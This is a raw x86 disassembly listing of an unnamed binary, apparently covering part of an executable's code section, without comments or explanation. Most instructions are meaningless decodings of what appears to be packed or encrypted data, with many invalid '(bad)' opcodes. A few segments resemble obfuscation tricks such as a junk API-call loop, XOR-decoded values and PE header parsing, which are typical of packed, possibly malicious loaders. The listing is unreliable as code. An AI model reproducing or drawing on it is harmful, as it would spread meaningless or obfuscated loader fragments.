  409c62:	xor    dl,bh
  409c64:	pop    esi
  409c65:	push   ds
  409c66:	imul   edx,DWORD PTR [edi+0x608d4ea7],0xffffffd5
  409c6d:	iret   
  409c6e:	(bad)  
  409c6f:	das    
  409c70:	out    0x12,al
  409c72:	scas   al,BYTE PTR es:[edi]
  409c73:	retf   0xee94
  409c76:	sub    ebp,DWORD PTR [eax-0x35e18e3d]
  409c7c:	or     esp,DWORD PTR [eax]
  409c7e:	push   edx
  409c7f:	jle    0x409c23
  409c81:	fmul   QWORD PTR [eax+0x23efc1e]
  409c88:	push   esi
  409c89:	les    ebx,FWORD PTR [edi-0x1a]
  409c8c:	xchg   ebp,eax
  409c8d:	fnstsw WORD PTR [ecx]
  409c8f:	pop    ds
  409c90:	cli    
  409c91:	rol    BYTE PTR [edi+0x7],0xfd
  409c95:	mov    bh,BYTE PTR ds:0x83e2caec
  409c9b:	push   0x87fc272d
  409ca0:	data16 sti 
  409ca2:	cmp    eax,0x81008acd
  409ca7:	adc    eax,0x42473e
  409cac:	loopne 0x409c54
  409cae:	inc    esp
  409caf:	add    BYTE PTR [esi*1+0x66e94934],al
  409cb6:	add    DWORD PTR [eax],eax
  409cb8:	add    BYTE PTR [ecx],al
  409cba:	bound  esp,QWORD PTR [eax-0x13]
  409cbd:	arpl   bp,bp
  409cbf:	cdq    
  409cc0:	jp     0x409c53
  409cc2:	fldenv [esi+ebx*2-0x27b2938c]
  409cc9:	mov    cl,0xc0
  409ccb:	jl     0x409d49
  409ccd:	retf   0x7c7f
  409cd0:	jl     0x409ce3
  409cd2:	iret   
  409cd3:	push   ds
  409cd4:	pusha  
  409cd5:	cmp    eax,DWORD PTR [ebp-0x11]
  409cd8:	rcl    edx,1
  409cda:	clc    
  409cdb:	stos   DWORD PTR es:[edi],eax
  409cdc:	xlat   BYTE PTR ds:[ebx]
  409cdd:	iret   
  409cde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cdf:	in     al,dx
  409ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ce1:	jo     0x409c93
  409ce3:	out    0x97,al
  409ce5:	sbb    BYTE PTR [ecx],al
  409ce7:	mov    ecx,0x9ff8a68d
  409cec:	jmp    0xb18f249b
  409cf1:	cs mov ebx,0x418b1ef0
  409cf7:	xor    BYTE PTR ds:0x43340eef,cl
  409cfd:	or     BYTE PTR ds:0xc2cdca12,dl
  409d03:	adc    DWORD PTR [edi],edx
  409d05:	sub    bl,BYTE PTR [esi-0x7a5cd238]
  409d0b:	into   
  409d0c:	xchg   esi,eax
  409d0d:	mov    al,ds:0xf27ae8ed
  409d12:	es popf 
  409d14:	inc    edi
  409d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d16:	xor    edx,DWORD PTR [ebp+0x73]
  409d19:	fmul   DWORD PTR [edx-0x1e]
  409d1c:	scas   eax,DWORD PTR es:[edi]
  409d1d:	lock imul ebp,DWORD PTR [edx+0x607ec828],0x13ed20dd
  409d28:	sahf   
  409d29:	push   esp
  409d2a:	jns    0x409cca
  409d2c:	fs jo  0x409da6
  409d2f:	gs int3 
  409d31:	mov    bl,0xf0
  409d33:	or     DWORD PTR [esi-0x36],ebx
  409d36:	fsub   QWORD PTR [esi+0x28]
  409d39:	ror    DWORD PTR [ecx+0x72a99a8c],cl
  409d3f:	or     edi,DWORD PTR [ebx]
  409d41:	sub    dl,0x89
  409d44:	neg    DWORD PTR [ecx-0x661100bb]
  409d4a:	adc    bl,BYTE PTR fs:[ecx]
  409d4d:	outs   dx,DWORD PTR ds:[esi]
  409d4e:	sbb    BYTE PTR [ebp+0x24],0xbc
  409d52:	stc    
  409d53:	mov    esi,0x375b1ac4
  409d58:	and    eax,0x3bd09b77
  409d5d:	mov    eax,0xeae2e40e
  409d62:	or     BYTE PTR [esi+0x5a48ea33],dh
  409d68:	scas   al,BYTE PTR es:[edi]
  409d69:	mov    ebp,0x8fed552e
  409d6e:	mov    dh,0x6e
  409d70:	hlt    
  409d71:	repz xor DWORD PTR [edx+0x69],esi
  409d75:	fisub  DWORD PTR [eax-0x6ff857c8]
  409d7b:	repz or eax,0xb2b33536
  409d81:	test   al,0xa0
  409d83:	ins    BYTE PTR es:[edi],dx
  409d84:	cli    
  409d85:	sbb    BYTE PTR [ebx-0x5d],bl
  409d88:	sub    al,0x3b
  409d8a:	mov    cl,bh
  409d8c:	or     BYTE PTR [ebp-0x3de24983],al
  409d92:	jl     0x409dde
  409d94:	mov    DWORD PTR [ebx],edx
  409d96:	sub    edi,DWORD PTR [ebp-0x52]
  409d99:	inc    edi
  409d9a:	leave  
  409d9b:	and    al,0x4c
  409d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d9e:	repnz loopne 0x409d4c
  409da1:	rsm    
  409da3:	pop    es
  409da4:	fstp   QWORD PTR [esi]
  409da6:	data16 xlat BYTE PTR ds:[ebx]
  409da8:	push   cs
  409da9:	or     dh,bl
  409dab:	(bad)  
  409dac:	std    
  409dad:	jbe    0x409da4
  409daf:	fsubr  QWORD PTR [eax-0x5e833ca3]
  409db5:	push   edx
  409db6:	cmp    DWORD PTR [ebx+esi*1],esp
  409db9:	push   ecx
  409dba:	repnz repnz pop esi
  409dbd:	dec    eax
  409dbe:	add    dl,ch
  409dc0:	cs xchg ebx,eax
  409dc2:	rol    bl,1
  409dc4:	cs cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  409dc7:	mov    ds:0xd43b7293,al
  409dcc:	push   DWORD PTR [edx+0x3a423b35]
  409dd2:	fcmovu st,st(0)
  409dd4:	in     eax,dx
  409dd5:	xchg   BYTE PTR cs:[eax+eax*2-0x40],ch
  409dda:	(bad)  [ebx-0x44]
  409ddd:	pop    eax
  409dde:	sar    DWORD PTR [edi*2+0x884b1ce],1
  409de5:	(bad)  [esi-0x21]
  409de8:	xor    eax,DWORD PTR [eax+0x57e94225]
  409dee:	dec    edi
  409def:	dec    ebx
  409df0:	jmp    0xd4dd:0x358e33bc
  409df7:	fstp   DWORD PTR [edx]
  409df9:	sub    ebx,DWORD PTR [edx]
  409dfb:	push   edi
  409dfc:	jmp    0x409dd3
  409dfe:	in     al,dx
  409dff:	adc    ch,cl
  409e01:	test   BYTE PTR [ecx+0x7dc08d86],cl
  409e07:	jno    0x409d9a
  409e09:	pop    ss
  409e0a:	or     edi,DWORD PTR [esi]
  409e0c:	scas   al,BYTE PTR es:[edi]
  409e0d:	pushf  
  409e0e:	add    edi,DWORD PTR [edi]
  409e10:	je     0x409dca
  409e12:	jns    0x409dce
  409e14:	not    ebx
  409e16:	cmp    al,0xb1
  409e18:	data16 mov dh,0x51
  409e1b:	push   esp
  409e1c:	lahf   
  409e1d:	pop    edi
  409e1e:	jns    0x409e5c
  409e20:	retf   
  409e21:	mov    DWORD PTR ds:0x424726,0x71b7
  409e2b:	jne    0x40a324
  409e31:	or     DWORD PTR ds:0x410757,edx
  409e37:	mov    eax,DWORD PTR [ebp+0x8]
  409e3a:	mov    ecx,DWORD PTR [ebp+0x8]
  409e3d:	adc    DWORD PTR ds:0x447988,0x48d6
  409e47:	add    ecx,DWORD PTR [eax+0x3c]
  409e4a:	mov    edx,DWORD PTR ds:0x4444dc
  409e50:	xor    eax,eax
  409e52:	or     eax,DWORD PTR ds:0x4444e8
  409e58:	sub    eax,edx
  409e5a:	and    edx,DWORD PTR [edx+eax*1]
  409e5d:	mov    edx,0x7510857
  409e62:	mov    DWORD PTR ds:0x410743,0x1d
  409e6c:	cmp    DWORD PTR ds:0x410743,0x0
  409e73:	je     0x409eb2
  409e79:	cmp    DWORD PTR ds:0x410743,0x2c
  409e80:	jne    0x409ea2
  409e86:	push   DWORD PTR [ebp-0x1c]
  409e89:	push   DWORD PTR [ebp-0x28]
  409e8c:	push   DWORD PTR [ebp-0x10]
  409e8f:	push   0x1f6d
  409e94:	push   0x61b1
  409e99:	push   DWORD PTR [ebp-0x14]
  409e9c:	call   DWORD PTR ds:0x442044
  409ea2:	mov    eax,ds:0x410743
  409ea7:	dec    eax
  409ea8:	mov    ds:0x410743,eax
  409ead:	jmp    0x409e6c
  409eb2:	mov    DWORD PTR [ebp+0x8],ecx
  409eb5:	mov    eax,DWORD PTR [ebp-0x4]
  409eb8:	xor    eax,edx
  409eba:	push   esi
  409ebb:	mov    esi,DWORD PTR [ebp+0x8]
  409ebe:	mov    ecx,0x32729e
  409ec3:	add    eax,ecx
  409ec5:	cmp    DWORD PTR [esi+0x54],eax
  409ec8:	jmp    0x40a033
  409ecd:	mov    esi,0x45a9bf40
  409ed2:	mov    ebp,0xfb297b56
  409ed7:	test   BYTE PTR [esi-0x106de86a],bl
  409edd:	cmpps  xmm7,XMMWORD PTR [esp+edi*2-0x36],0x7f
  409ee3:	jl     0x409f61
  409ee5:	dec    esi
  409ee7:	loopne 0x409ed9
  409ee9:	dec    ecx
  409eea:	shl    DWORD PTR [ecx+0x395a9a26],cl
  409ef0:	cmp    al,BYTE PTR ds:0x11aae0a2
  409ef6:	push   0xffffff82
  409ef8:	dec    edi
  409ef9:	or     esi,ecx
  409efb:	cmp    esp,DWORD PTR [ebp+0x765b46d9]
  409f01:	jge    0x409eff
  409f03:	pop    eax
  409f04:	int3   
  409f05:	shl    BYTE PTR ds:0xbb86f358,0x4a
  409f0c:	enter  0x7a65,0xe4
  409f10:	pop    ss
  409f11:	jbe    0x409ebc
  409f13:	xor    BYTE PTR [edx-0x6a],cl
  409f16:	jge    0x409f64
  409f18:	aad    0x2a
  409f1a:	cmp    BYTE PTR [ebp+0x66],0xcd
  409f1e:	pop    edx
  409f1f:	sbb    DWORD PTR [edx],0xffffffbe
  409f22:	int    0xf6
  409f24:	jb     0x409f71
  409f26:	add    edx,ecx
  409f28:	pop    edx
  409f29:	cmp    esi,DWORD PTR [eax]
  409f2b:	xchg   edx,eax
  409f2c:	mov    ch,0x16
  409f2e:	xor    DWORD PTR [esi+ebx*2],esp
  409f31:	cli    
  409f32:	ins    BYTE PTR es:[edi],dx
  409f33:	mov    dh,BYTE PTR [esi+0x4]
  409f36:	leave  
  409f37:	stc    
  409f38:	or     eax,0xb32fab12
  409f3d:	jae    0x409eea
  409f3f:	sub    DWORD PTR [ebp+0x3e],edx
  409f42:	rol    BYTE PTR [esi-0x20],1
  409f45:	push   ds
  409f46:	push   esp
  409f47:	imul   esp,DWORD PTR [ecx],0x69406182
  409f4d:	fisubr WORD PTR [edi-0x76]
  409f50:	cli    
  409f51:	int    0x7e
  409f53:	xor    DWORD PTR [esi+0x13],ecx
  409f56:	xchg   DWORD PTR [edx-0x3ca8f411],ebp
  409f5c:	adc    al,0xe
  409f5e:	or     al,0xc9
  409f60:	mov    ebp,DWORD PTR [esp+eax*4-0x388cbb65]
  409f67:	cmp    BYTE PTR [ecx],al
  409f69:	cmp    BYTE PTR ds:[ecx],dh
  409f6c:	imul   ebx,DWORD PTR [esi+ecx*1],0x8cea5ac0
  409f73:	or     al,0x7d
  409f75:	xchg   ecx,eax
  409f76:	pop    edi
  409f77:	int3   
  409f78:	fild   WORD PTR [edi-0x76d3f2d3]
  409f7e:	fdivr  QWORD PTR [ebp-0x51a2d136]
  409f84:	popf   
  409f85:	sbb    DWORD PTR [edx+0x24],eax
  409f88:	and    eax,0x694a941f
  409f8d:	pop    edi
  409f8e:	inc    eax
  409f8f:	jp     0x409f19
  409f91:	out    0x90,eax
  409f93:	ret    0xff1e
  409f96:	lods   eax,DWORD PTR ds:[esi]
  409f97:	cmc    
  409f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f99:	xchg   BYTE PTR [edi+0x6c],ch
  409f9c:	push   ebp
  409f9d:	sub    DWORD PTR [ebp+0x1671fa15],ecx
  409fa3:	xchg   ebp,eax
  409fa4:	stc    
  409fa5:	push   ebp
  409fa6:	idiv   DWORD PTR [esi-0x38]
  409fa9:	nop
  409faa:	push   DWORD PTR [esi-0xb1543e2]
  409fb0:	and    dh,BYTE PTR [ecx+0x5]
  409fb3:	mul    DWORD PTR [ecx-0x48]
  409fb6:	pop    edx
  409fb7:	sub    DWORD PTR [ebx],0xffffffd7
  409fba:	repz icebp 
  409fbc:	lea    ebx,[eax+0x4ff1a6ba]
  409fc2:	jge    0x409faa
  409fc4:	xchg   ebp,eax
  409fc5:	retf   
  409fc6:	sbb    ah,BYTE PTR [eax+0x63bc650e]
  409fcc:	push   cx
  409fce:	push   edx
  409fcf:	cmp    BYTE PTR [ebp+0xc],bl
  409fd2:	ss and eax,0x3679a221
  409fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd9:	xor    eax,0x4855740a
  409fde:	lock mov ds:0x5d30d404,eax
  409fe4:	out    0xc3,eax
  409fe6:	adc    dh,BYTE PTR [edx-0x23390d98]
  409fec:	test   al,0x78
  409fee:	jle    0x40a035
  409ff0:	in     eax,0xc
  409ff2:	mov    ah,0xe6
  409ff4:	mov    edi,0x96e20e93
  409ff9:	sub    esp,DWORD PTR [esi]
  409ffb:	adc    eax,0x57906b14
  40a000:	jge    0x409ffc
  40a002:	lods   eax,DWORD PTR ds:[esi]
  40a003:	bsr    eax,DWORD PTR [eax+0x43]
  40a007:	(bad)  
  40a008:	xor    al,0xff
  40a00a:	inc    esp
  40a00b:	out    0xae,al
  40a00d:	pop    ss
  40a00e:	rol    DWORD PTR [edi+0x40],0xa2
  40a012:	push   cs
  40a013:	jp     0x40a029
  40a015:	and    al,0x43
  40a017:	dec    esp
  40a018:	push   edx
  40a019:	fisub  DWORD PTR [ebx]
  40a01b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a01c:	in     al,dx
  40a01d:	clc    
  40a01e:	xchg   ecx,eax
  40a01f:	js     0x409fe4
  40a021:	mov    ebx,DWORD PTR [eax+0x15]
  40a024:	add    edi,DWORD PTR [esi+0x1f]
  40a027:	gs push ebx
  40a029:	daa    
  40a02a:	add    al,cl
  40a02c:	lds    ebp,FWORD PTR [esi+edi*8-0xfbfbe6a]
  40a033:	pop    esi
  40a034:	je     0x40a1ad
  40a03a:	mov    eax,DWORD PTR [ebp+0x8]
  40a03d:	jmp    0x40a331
  40a042:	jmp    0x40a1ad
  40a047:	xchg   ecx,eax
  40a048:	test   dh,dl
  40a04a:	loopne 0x40a045
  40a04c:	bound  edi,QWORD PTR [ebp+0x7db7845d]
  40a052:	add    eax,esp
  40a054:	dec    ecx
  40a055:	and    DWORD PTR [ebx+0x7c7cc5dd],eax
  40a05b:	retf   0x7c7f
  40a05e:	jl     0x40a0d8
  40a060:	inc    esp
  40a061:	test   DWORD PTR [ebp-0x3fd2eb4b],ecx
  40a067:	adc    al,0x50
  40a069:	jmp    0xf13b:0xb2bef387
  40a070:	cmc    
  40a071:	push   esi
  40a072:	cld    
  40a073:	cmovne ecx,DWORD PTR [eax-0x3f]
  40a077:	cmp    esi,DWORD PTR [ecx+0x6f]
  40a07a:	cli    
  40a07b:	xchg   ebx,eax
  40a07c:	retf   
  40a07d:	stos   DWORD PTR es:[edi],eax
  40a07e:	cmp    al,0x18
  40a080:	stos   BYTE PTR es:[edi],al
  40a081:	xchg   ebp,eax
  40a082:	or     al,0x1c
  40a084:	je     0x40a0f9
  40a086:	jecxz  0x40a06e
  40a088:	lods   al,BYTE PTR ds:[esi]
  40a089:	mov    dl,0x1
  40a08b:	stos   DWORD PTR es:[edi],eax
  40a08c:	push   esp
  40a08d:	or     eax,0x7f8541d5
  40a092:	mov    eax,ds:0x23617df5
  40a097:	xlat   BYTE PTR ds:[ebx]
  40a098:	push   es
  40a099:	hlt    
  40a09a:	mov    dh,0x3b
  40a09c:	sub    BYTE PTR [ebx-0x55],cl
  40a09f:	xor    edx,ecx
  40a0a1:	hlt    
  40a0a2:	xchg   ch,ah
  40a0a4:	push   edi
  40a0a5:	add    BYTE PTR [edi-0x4061b7e6],al
  40a0ab:	dec    ebx
  40a0ac:	lods   al,BYTE PTR ds:[esi]
  40a0ad:	cmc    
  40a0ae:	mov    eax,0xf770f2d6
  40a0b3:	mov    ecx,0x7eecd357
  40a0b8:	push   ds
  40a0b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ba:	ins    DWORD PTR es:[edi],dx
  40a0bb:	dec    ebx
  40a0bc:	push   eax
  40a0bd:	lods   eax,DWORD PTR ds:[esi]
  40a0be:	mov    ch,BYTE PTR [ecx-0xf]
  40a0c1:	scas   al,BYTE PTR es:[edi]
  40a0c2:	sbb    DWORD PTR [ebx-0x4d],ecx
  40a0c5:	(bad)  [edx+esi*4-0x5135ace4]
  40a0cc:	outs   dx,BYTE PTR ds:[esi]
  40a0cd:	lock fld TBYTE PTR [esi]
  40a0d0:	dec    eax
  40a0d1:	jns    0x40a05b
  40a0d3:	pop    ecx
  40a0d4:	adc    cl,ah
  40a0d6:	dec    esi
  40a0d7:	ja     0x40a0fb
  40a0d9:	mov    DWORD PTR ds:0x548c428c,edx
  40a0e0:	inc    esi
  40a0e1:	mov    ch,0xb2
  40a0e3:	or     DWORD PTR [edx],ebx
  40a0e5:	adc    al,0xac
  40a0e7:	jl     0x40a084
  40a0e9:	shl    DWORD PTR [ebx-0x7b],0x28
  40a0ed:	adc    dl,0xe4
  40a0f0:	into   
  40a0f1:	xor    BYTE PTR [edx+0x48ca6ed],dh
  40a0f7:	(bad)  
  40a0f8:	push   edx
  40a0f9:	mov    es,WORD PTR [edx-0x6ac1d155]
  40a0ff:	xchg   ecx,eax
  40a100:	mov    dl,BYTE PTR [ebp-0x141a492d]
  40a106:	icebp  
  40a107:	(bad)  
  40a108:	mov    eax,0xe62022ba
  40a10d:	aas    
  40a10e:	repz mov ebp,0x6e7b07e5
  40a114:	xlat   BYTE PTR ds:[ebx]
  40a115:	pop    eax
  40a116:	lock or esi,0xffffff8b
  40a11a:	or     BYTE PTR [ebp*1+0x392254a2],0x6f
  40a122:	fist   DWORD PTR [esi+0x7f5b5c11]
  40a128:	lea    edx,ds:0xd5e4d70b
  40a12e:	add    al,0x6b
  40a130:	mov    edx,0xa43ea453
  40a135:	enter  0xb387,0x45
  40a139:	or     BYTE PTR [ecx],al
  40a13b:	pop    edx
  40a13c:	inc    esi
  40a13d:	mov    ebp,0x3be03eb6
  40a142:	adc    si,bx
  40a145:	ins    DWORD PTR es:[edi],dx
  40a146:	retf   
  40a147:	xor    dh,BYTE PTR [ebx+0x5d]
  40a14a:	in     al,0xfa
  40a14c:	mul    BYTE PTR [ecx+0x67]
  40a14f:	aaa    
  40a150:	aas    
  40a151:	cdq    
  40a152:	sub    DWORD PTR [ecx+0x51f58ca5],0xffffffb9
  40a159:	imul   ebp,edi,0x3a6ae226
  40a15f:	jbe    0x40a153
  40a161:	dec    ecx
  40a162:	jae    0x40a0f0
  40a164:	imul   ebx,edi,0xffffffab
  40a167:	jae    0x40a182
  40a169:	mov    esp,0x4d7f7d13
  40a16e:	stos   BYTE PTR es:[edi],al
  40a16f:	mov    ds:0xcde2264d,al
  40a174:	mov    cl,BYTE PTR [edi+0x78]
  40a177:	repz and DWORD PTR ds:0xfa3f5d48,0xe
  40a17f:	ret    
  40a180:	test   BYTE PTR [ebx],0x7b
  40a183:	push   edx
  40a184:	iret   
  40a185:	pop    ss
  40a186:	lea    ebp,[ecx]
  40a188:	push   es
  40a189:	aas    
  40a18a:	shr    DWORD PTR [edi+0xc6c0736],1
  40a190:	or     eax,0x9f38c3a9
  40a195:	mov    ?,WORD PTR [ebx+esi*4+0x6cd6445]
  40a19c:	push   0xffffffed
  40a19e:	cs push edx
  40a1a0:	int    0x24
  40a1a2:	(bad)  
  40a1a3:	push   ss
  40a1a4:	addr16 (bad) 
  40a1a6:	in     al,0x82
  40a1a8:	jg     0x40a144
  40a1aa:	inc    esp
  40a1ab:	xor    BYTE PTR [esi],cl
  40a1ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a1b0:	jmp    0x40a31b
  40a1b5:	aam    0x68
  40a1b7:	rol    BYTE PTR [eax+0x50],1
  40a1ba:	pop    eax
  40a1bb:	fs js  0x40a15e
  40a1be:	jge    0x40a14e
  40a1c0:	fdivrp st(4),st
  40a1c2:	mov    cl,dh
  40a1c4:	mov    ebp,DWORD PTR [ebx-0x3583833c]
  40a1ca:	jg     0x40a248
  40a1cc:	jl     0x40a1d6
  40a1ce:	push   ecx
  40a1cf:	retf   0xd9fe
  40a1d2:	sub    ch,bh
  40a1d4:	push   esi
  40a1d5:	fwait
  40a1d6:	pushf  
  40a1d7:	call   0x7071:0x65c29c8a
  40a1de:	je     0x40a1f8
  40a1e0:	lods   eax,DWORD PTR ds:[esi]
  40a1e1:	ins    DWORD PTR es:[edi],dx
  40a1e2:	pusha  
  40a1e3:	mov    ebx,0x22b57693
  40a1e8:	add    BYTE PTR [ecx-0x38a8bf44],bl
  40a1ee:	leave  
  40a1ef:	aaa    
  40a1f0:	jecxz  0x40a254
  40a1f2:	fsubr  QWORD PTR [ebx]
  40a1f4:	dec    edx
  40a1f5:	mov    dl,0x31
  40a1f7:	mov    cs:0xa5d6346b,al
  40a1fd:	ror    DWORD PTR [ebx+0x6a],cl
  40a200:	pop    ebp
  40a201:	rcr    esi,1
  40a203:	mov    eax,0x429e87e5
  40a208:	cmp    al,0xac
  40a20a:	cld    
  40a20b:	xor    BYTE PTR [ebx-0x361ef61b],dh
  40a211:	out    dx,al
  40a212:	cmp    DWORD PTR [ebp+0x647294d0],edi
  40a218:	stos   DWORD PTR es:[edi],eax
  40a219:	xchg   ebx,eax
  40a21a:	dec    esp
  40a21b:	xlat   BYTE PTR ds:[ebx]
  40a21c:	xor    BYTE PTR [edx+eiz*4+0x61befc02],bl
  40a223:	mov    edi,?
  40a225:	cmc    
  40a226:	xor    edi,edi
  40a228:	ja     0x40a288
  40a22a:	stc    
  40a22b:	dec    esp
  40a22c:	mov    bh,0xd2
  40a22e:	sar    DWORD PTR [edi-0x64ff5512],cl
  40a234:	ds loopne 0x40a283
  40a237:	mov    esp,0x9b5c6a4f
  40a23c:	adc    al,BYTE PTR [esi]
  40a23e:	xor    BYTE PTR [eax+edx*1],0xa6
  40a242:	inc    eax
  40a244:	mov    ds:0x1c38fc3c,eax
  40a249:	cld    
  40a24a:	loopne 0x40a2c2
  40a24c:	lods   al,BYTE PTR ds:[esi]
  40a24d:	push   edi
  40a24e:	pop    es
  40a24f:	and    ah,dl
  40a251:	cmp    DWORD PTR [edx+0x0],ebp
  40a254:	inc    edi
  40a255:	push   edx
  40a256:	xchg   ebp,eax
  40a257:	mov    ebx,0xc2c8426e
  40a25c:	add    ecx,ebp
  40a25e:	push   0xfeaeacf7
  40a263:	scas   eax,DWORD PTR es:[edi]
  40a264:	sahf   
  40a265:	out    0x6a,eax
  40a267:	lds    eax,FWORD PTR [edi+0x2c]
  40a26a:	jmp    0x40a216
  40a26c:	mov    DWORD PTR [edx],esi
  40a26e:	inc    edi
  40a26f:	scas   eax,DWORD PTR es:[edi]
  40a270:	int    0x68
  40a272:	daa    
  40a273:	gs ins BYTE PTR es:[edi],dx
  40a275:	mul    edx
  40a277:	loopne 0x40a241
  40a279:	and    bl,al
  40a27b:	mov    ch,0x5b
  40a27d:	ins    DWORD PTR es:[edi],dx
  40a27e:	addr16 jbe 0x40a2f1
  40a281:	cld    
  40a282:	cdq    
  40a283:	mov    ebx,0xcfd18e95
  40a288:	std    
  40a289:	or     eax,0x1bc44977
  40a28e:	nop
  40a28f:	mov    bh,0x72
  40a291:	or     BYTE PTR ds:[esi+0x3e7cad3],0x9f
  40a299:	jb     0x40a24e
  40a29b:	int3   
  40a29c:	lahf   
  40a29d:	jo     0x40a29c
  40a29f:	inc    esi
  40a2a0:	cmp    ch,ch
  40a2a2:	cld    
  40a2a3:	ja     0x40a313
  40a2a5:	sub    ebp,DWORD PTR [esi+ebp*4]
  40a2a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2a9:	js     0x40a299
  40a2ab:	mov    ecx,0x639dc27c
  40a2b0:	in     eax,0x6
  40a2b2:	lahf   
  40a2b3:	jl     0x40a287
  40a2b5:	pop    ecx
  40a2b6:	and    BYTE PTR [edx+0x78ea997d],bh
  40a2bc:	lods   eax,DWORD PTR ds:[esi]
  40a2bd:	xchg   ecx,eax
  40a2be:	cmp    DWORD PTR [edi+0x3a],esi
  40a2c1:	and    eax,DWORD PTR [eax+0x46e3a5aa]
  40a2c7:	inc    eax
  40a2c8:	xor    al,0xb4
  40a2ca:	or     cl,BYTE PTR [ebx+ebx*2-0x436e7263]
  40a2d1:	cld    
  40a2d2:	inc    esi
  40a2d3:	jb     0x40a2dd
  40a2d5:	mov    esp,DWORD PTR [eax+edi*8+0x42]
  40a2d9:	sub    DWORD PTR [ecx+ebp*8-0xc6f941d],eax
  40a2e0:	mov    ch,0x37
  40a2e2:	or     esi,esi
  40a2e4:	cwde   
  40a2e5:	cdq    
  40a2e6:	sub    bh,BYTE PTR [eax]
  40a2e8:	xchg   ebp,eax
  40a2e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2ea:	lds    edx,FWORD PTR cs:[esi+0x3fc77b4d]
  40a2f1:	adc    ah,bh
  40a2f3:	xor    DWORD PTR [edi],0xffffffa0
  40a2f6:	test   DWORD PTR [esi+edi*4+0x60f5939d],ebx
  40a2fd:	cmp    ch,BYTE PTR [ebx]
  40a2ff:	hlt    
  40a300:	xchg   ebx,eax
  40a301:	(bad)  
  40a302:	(bad)  
  40a303:	and    ch,BYTE PTR [edx]
  40a305:	lods   al,BYTE PTR ds:[esi]
  40a306:	mov    al,BYTE PTR [ebx]
  40a308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a309:	sub    esp,DWORD PTR [edx+0x2f]
  40a30c:	outs   dx,BYTE PTR ds:[esi]
  40a30d:	iret   
  40a30e:	enter  0xef78,0x31
  40a312:	or     bl,BYTE PTR [ecx-0x54c3497b]
  40a318:	mov    esi,0xc233ec95
  40a31d:	add    eax,ecx
  40a31f:	jmp    0x40a331
  40a324:	mov    eax,DWORD PTR [ebp-0x4]
  40a327:	xor    eax,0x7510857
  40a32c:	add    eax,0x32729e
  40a331:	leave  
  40a332:	ret    0x4
  40a335:	dec    ebp
  40a336:	push   ebp
  40a337:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40a33d:	mov    esp,ebp
  40a33f:	or     ah,dh
  40a341:	dec    ebp
  40a342:	add    bh,al
  40a344:	add    BYTE PTR [eax],cl
  40a346:	add    BYTE PTR [eax],al
  40a348:	mov    DWORD PTR [eax],0x40f44545
  40a34e:	xor    eax,0x9c8b8500
  40a353:	hlt    
  40a354:	clc    
  40a355:	retf   
  40a356:	(bad)  
  40a357:	enter  0x4d45,0xbc
  40a35b:	mov    esi,DWORD PTR [esp+esi*8]
  40a35e:	test   ebx,ecx
  40a360:	pushf  
  40a361:	enter  0x4df8,0x8b
  40a365:	mov    DWORD PTR [ebp-0x20],0x890208
  40a36c:	inc    ebp
  40a36d:	inc    ebp
  40a36e:	cld    
  40a36f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40a375:	or     BYTE PTR [ebx+0x0],dl
  40a378:	mov    ebx,0x8bd5700
  40a37d:	call   DWORD PTR [ecx-0x1]
  40a380:	pop    es
  40a381:	mov    ch,0x33
  40a383:	dec    ebx
  40a385:	(bad)  
  40a386:	mov    eax,0x72009ea4
  40a38b:	push   DWORD PTR [edx]
  40a38d:	or     BYTE PTR [eax],al
  40a38f:	jmp    0xff89:0x75c84d03
  40a396:	dec    ebp
  40a397:	loopne 0x40a369
  40a399:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40a39f:	add    BYTE PTR [ebx],dh
  40a3a1:	mov    ecx,ebx
  40a3a3:	hlt    
  40a3a4:	add    ecx,ebx
  40a3a6:	enter  0x899e,0x32
  40a3aa:	dec    ebp
  40a3ab:	add    ecx,eax
  40a3ad:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40a3b3:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40a3ba:	xor    ecx,ebx
  40a3bc:	retf   
  40a3bd:	enter  0x4d03,0xc8
  40a3c1:	mov    DWORD PTR fs:[eax],ebx
  40a3c4:	lea    eax,[eax]
  40a3c6:	push   esp
  40a3c7:	mov    edi,edi
  40a3c9:	fs (bad) 
  40a3cb:	(bad)  
  40a3cc:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40a3d2:	push   0xffffffff
  40a3d4:	and    bh,bh
  40a3d6:	pop    ecx
  40a3d7:	inc    eax
  40a3d8:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40a3de:	push   0xffffff8b
  40a3e0:	pop    ecx
  40a3e1:	cld    
  40a3e2:	dec    ebp
  40a3e3:	lea    ecx,[ecx+0x45ff08ff]
  40a3e9:	mov    BYTE PTR [edx+0x1],cl
  40a3ec:	add    BYTE PTR [eax],al
  40a3ee:	mov    DWORD PTR [ebp+0x8],0x58008d
  40a3f5:	dec    DWORD PTR [ebp-0x77]
  40a3f8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40a3ff:	cld    
  40a400:	dec    ebp
  40a401:	jne    0x40a436
  40a403:	lea    eax,[ebx]
  40a405:	push   eax
  40a406:	mov    edi,edi
  40a408:	or     BYTE PTR [ecx+0x54a845],cl
  40a40e:	add    al,ch
  40a410:	(bad)  
  40a411:	sub    ebp,esp
  40a413:	add    BYTE PTR [eax],al
  40a415:	rol    BYTE PTR [eax],0x84
  40a418:	inc    ebp
  40a419:	add    dh,BYTE PTR [esi+0x0]
  40a41c:	add    BYTE PTR [ebp-0x73],al
  40a41f:	mov    ebp,DWORD PTR [esp+edx*4]
  40a422:	inc    DWORD PTR [eax]
